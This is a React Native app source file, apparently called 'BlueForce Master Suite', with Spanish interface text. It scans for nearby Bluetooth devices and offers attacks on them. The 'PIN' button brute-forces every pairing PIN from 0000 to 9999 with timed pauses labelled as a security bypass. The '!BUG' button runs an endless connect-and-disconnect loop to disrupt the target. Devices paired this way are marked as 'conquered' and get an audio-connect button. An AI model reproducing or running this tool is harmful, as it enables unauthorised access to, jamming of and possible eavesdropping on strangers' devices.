import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

// COMPONENTE: Medidor de Señal Visual
const SignalMeter = ({ rssi }) => {
  let s = 0;
  if (rssi > -50) s = 5; else if (rssi > -65) s = 4; else if (rssi > -75) s = 3; else if (rssi > -85) s = 2; else if (rssi > -100) s = 1;
  const c = s >= 4 ? '#00ff88' : s === 3 ? '#ffea00' : '#ff3c00';
  return (
    <View style={styles.meterContainer}>
      {[1, 2, 3, 4, 5].map(b => <View key={b} style={[styles.bar, { height: b * 3, backgroundColor: b <= s ? c : '#222' }]} />)}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({}); // { mac: { status, pin } }
  const [aliases, setAliases] = useState({}); // { mac: alias }
  const [activeTarget, setActiveTarget] = useState(null);
  const [mode, setMode] = useState('IDLE');
  const [isScanning, setIsScanning] = useState(false);
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        ]);
        addLog("⚙️ Sistemas armados.");
      }
    })();
  }, []);

  const updateHistory = (mac, status, pin = null) => {
    setHistory(prev => ({ ...prev, [mac]: { status, pin } }));
  };

  const renameDevice = (mac, current) => {
    Alert.prompt("ASIGNAR ALIAS", `Nombre táctico para ${current}`, [
      { text: "CANCELAR", style: "cancel" },
      { text: "GUARDAR", onPress: (n) => { if (n) setAliases(p => ({ ...p, [mac]: n.toUpperCase() })); } }
    ], "plain-text");
  };

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    addLog("📡 Escaneando área...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi));
    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setActiveTarget(device.address);
    setMode('BRUTE');
    updateHistory(device.address, '⚔️ PROBANDO');
    
    for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        try {
            await RNBluetoothClassic.pairDevice(device.address, { pin });
            await new Promise(r => setTimeout(r, 1500)); // Espera verificación
            const bonded = await RNBluetoothClassic.getBondedDevices();
            if (bonded.some(d => d.address === device.address)) {
                updateHistory(device.address, '🔓 CONQUISTADO', pin);
                setMode('IDLE'); setActiveTarget(null);
                Alert.alert("ÉXITO", "DISPOSITIVO VINCULADO REAL"); return;
            }
            if (i > 0 && i % 8 === 0) await new Promise(r => setTimeout(r, 3000)); // Bypass seguridad
        } catch (e) { await new Promise(r => setTimeout(r, 600)); }
    }
    setMode('IDLE'); setActiveTarget(null);
  };

  const startDisruptor = async (device) => {
    setActiveTarget(device.address);
    setMode('DISRUPTOR');
    updateHistory(device.address, '🔥 DISRUPCIÓN');
    while (true) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'DISRUPTOR') break;
        try {
            RNBluetoothClassic.startDiscovery();
            await RNBluetoothClassic.connectDevice(device.address, { connectorType: "rfcomm" });
            await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
    }
    RNBluetoothClassic.cancelDiscovery();
    setActiveTarget(null);
  };

  const stopOperation = () => {
    Alert.alert("CONFIRMAR", "¿Abortar misión y liberar objetivo?", [
        { text: "NO", style: "cancel" },
        { text: "SÍ, ABORTAR", onPress: () => { setMode('IDLE'); setActiveTarget(null); addLog("🛑 Operación detenida."); } }
    ]);
  };

  const renderItem = ({ item }) => {
    const h = history[item.address] || { status: '⚪ NUEVO' };
    const name = aliases[item.address] || item.name || "DESCONOCIDO";
    const isConquered = h.status.includes('🔓');
    const isThisActive = activeTarget === item.address;
    const isAnyActive = mode !== 'IDLE';

    return (
      <View style={[styles.card, isThisActive && { borderColor: '#00f2ff', borderWidth: 1 }]}>
        <SignalMeter rssi={item.rssi} />
        <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => renameDevice(item.address, name)}>
          <Text style={styles.deviceName}>{name}</Text>
          <Text style={styles.deviceMac}>{item.address}</Text>
          <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#666' }]}>{h.status} {h.pin ? `(PIN: ${h.pin})` : ''}</Text>
        </TouchableOpacity>
        <View style={{ flexDirection: 'row' }}>
          {isConquered ? (
            <TouchableOpacity style={styles.btnAud} onPress={() => RNBluetoothClassic.connectDevice(item.address)}>
              <Text style={styles.btnTextAud}>AUD</Text>
            </TouchableOpacity>
          ) : (
            <>
              <TouchableOpacity style={[styles.btnAction, {opacity: isAnyActive ? 0.3 : 1}]} onPress={() => startBruteForce(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>PIN</Text>
              </TouchableOpacity>
              <TouchableOpacity style={[styles.btnAction, { backgroundColor: '#ff0055', marginLeft: 5, opacity: isAnyActive ? 0.3 : 1 }]} onPress={() => startDisruptor(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>!BUG</Text>
              </TouchableOpacity>
            </>
          )}
        </View>
      </View>
    );
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Master Suite</Text>
      <View style={styles.panel}>
        <Text style={styles.pinLabel}>{mode === 'IDLE' ? 'READY' : `MODO ${mode}: ${currentPin}`}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanBtnText}>BARRIDO DE ENTORNOS</Text>}
        </TouchableOpacity>
      </View>
      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} style={{ flex: 1 }} />
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stopBtn} onPress={stopOperation}><Text style={styles.stopBtnText}>ABORTAR OPERACIÓN</Text></TouchableOpacity>}
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logLine}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#05070a', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20, borderBottomWidth: 3, borderBottomColor: '#00f2ff' },
  pinLabel: { color: '#fff', fontSize: 18, textAlign: 'center', marginBottom: 15, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanBtnText: { color: '#000', fontWeight: 'bold', fontSize: 16 },
  card: { backgroundColor: '#161a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  deviceName: { color: '#fff', fontWeight: 'bold', fontSize: 13, textTransform: 'uppercase' },
  deviceMac: { color: '#444', fontSize: 9 },
  historyText: { fontSize: 8, marginTop: 4, fontWeight: 'bold' },
  meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  bar: { width: 3, marginRight: 2, borderRadius: 1 },
  btnAction: { backgroundColor: '#222', paddingVertical: 10, paddingHorizontal: 15, borderRadius: 8 },
  btnAud: { backgroundColor: '#00ff88', paddingVertical: 10, paddingHorizontal: 20, borderRadius: 8 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  btnTextAud: { color: '#000', fontSize: 10, fontWeight: 'bold' },
  stopBtn: { backgroundColor: '#ff0055', padding: 18, borderRadius: 12, alignItems: 'center', marginBottom: 10 },
  stopBtnText: { color: '#fff', fontWeight: 'bold', fontSize: 16 },
  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  logLine: { color: '#333', fontSize: 9, marginBottom: 2 }
});
